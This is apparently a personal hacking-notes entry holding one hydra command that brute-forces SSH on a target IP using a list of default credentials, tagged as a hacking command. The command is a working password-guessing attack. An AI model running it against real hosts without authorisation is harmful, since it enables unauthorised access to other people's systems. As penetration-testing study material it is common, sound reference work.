# brute force default credentials ssh
```bash
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt -e nsr -t 1 $IP ssh
```

# Related

- [20221003150807](/zet/20221003150807/README.md) brute force default credentials
- ~/kb/hacking/commands/hydra-default-credentials.md

Tags:

    #assorted #command #hacking #hydra
